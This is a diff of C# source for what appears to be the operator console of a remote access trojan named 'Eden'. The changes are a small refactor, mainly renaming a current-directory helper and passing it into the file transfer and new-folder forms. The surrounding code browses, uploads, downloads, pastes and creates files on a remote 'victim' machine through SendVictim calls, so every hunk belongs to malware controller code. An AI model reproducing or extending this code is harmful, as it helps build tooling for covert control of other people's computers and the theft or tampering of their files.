@@ -86,7 +86,7 @@ namespace Eden
                     else if (aMsg[1] == "ls") //List dir.
                     {
                         string szDirPath = aMsg[2];
-                        if (!string.Equals(szDirPath, GetCurrentDir()))
+                        if (!string.Equals(szDirPath, fnGetCurrentDir()))
                             return;
 
                         string szJsonPayload = aMsg[3];
@@ -145,7 +145,7 @@ namespace Eden
                                 return;
                             }
 
-                            lsDir = lsDir.Where(x => tnFindTreeNodeFromTreeView(treeView1.Nodes, $"{GetCurrentDir()}/{x.Text}") == null).ToList();
+                            lsDir = lsDir.Where(x => tnFindTreeNodeFromTreeView(treeView1.Nodes, $"{fnGetCurrentDir()}/{x.Text}") == null).ToList();
 
                             if (currentNode.Nodes.Count == 0)
                                 currentNode.Nodes.AddRange(lsDir.Select(x => new TreeNode(x.Text)).ToArray());
@@ -274,7 +274,7 @@ namespace Eden
                             if (nCode == 0)
                             {
                                 MessageBox.Show("Path not found: " + szDirName, "Not found", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                                textBox1.Text = GetCurrentDir();
+                                textBox1.Text = fnGetCurrentDir();
 
                                 return;
                             }
@@ -492,7 +492,7 @@ namespace Eden
             }));
         }
 
-        private string GetCurrentDir()
+        private string fnGetCurrentDir()
         {
             string szDir = string.Empty;
             Invoke(new Action(() => szDir = textBox1.Tag.ToString()));
@@ -514,14 +514,14 @@ namespace Eden
             f.m_aItemText = aEntry;
             f.Show();
 
-            m_clnt.SendVictim(szVictimID, $"File|paste|{(bMove ? "1" : "0")}|{clsTools.EZData.OneDList2String(aEntry.ToList())}|{GetCurrentDir()}");
+            m_clnt.SendVictim(szVictimID, $"File|paste|{(bMove ? "1" : "0")}|{clsTools.EZData.OneDList2String(aEntry.ToList())}|{fnGetCurrentDir()}");
         }
 
         private void LvRefresh()
         {
             Invoke(new Action(() =>
             {
-                TreeNode node = treeView1.SelectedNode ?? tnFindTreeNodeFromTreeView(treeView1.Nodes, GetCurrentDir());
+                TreeNode node = treeView1.SelectedNode ?? tnFindTreeNodeFromTreeView(treeView1.Nodes, fnGetCurrentDir());
                 if (node == null)
                 {
                     MessageBox.Show("Variable \"node\" is null.", "Null", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -730,7 +730,7 @@ namespace Eden
             if (ofd.ShowDialog() == DialogResult.OK)
             {
                 List<string> lszFilePath = ofd.FileNames.ToList();
-                frmFileTransfer f = new frmFileTransfer(m_victim, lszFilePath, TransferFileType.UploadFile);
+                frmFileTransfer f = new frmFileTransfer(m_victim, fnGetCurrentDir(), lszFilePath, TransferFileType.UploadFile);
                 f.Show();
             }
         }
@@ -762,15 +762,13 @@ namespace Eden
                 );
             }
 
-            frmFileTransfer f = new frmFileTransfer(m_victim, lFile, TransferFileType.DownloadFile);
+            frmFileTransfer f = new frmFileTransfer(m_victim, fnGetCurrentDir(), lFile, TransferFileType.DownloadFile);
             f.Show();
         }
         //New - Folder
         private void toolStripMenuItem12_Click(object sender, EventArgs e)
         {
-            frmFileAddDir f = new frmFileAddDir();
-            f.m_clnt = m_clnt;
-
+            frmFileAddDir f = new frmFileAddDir(m_clnt, szVictimID);
             f.ShowDialog();
         }
         //New - File
@@ -782,7 +780,7 @@ namespace Eden
 
             f.Show();
 
-            f.ShowFileContent(GetCurrentDir() + "/NewFile_" + clsTools.GetFileNameFromDatetime("txt"), string.Empty);
+            f.ShowFileContent(fnGetCurrentDir() + "/NewFile_" + clsTools.GetFileNameFromDatetime("txt"), string.Empty);
         }
         //Image - Selected
         private void toolStripMenuItem14_Click(object sender, EventArgs e)
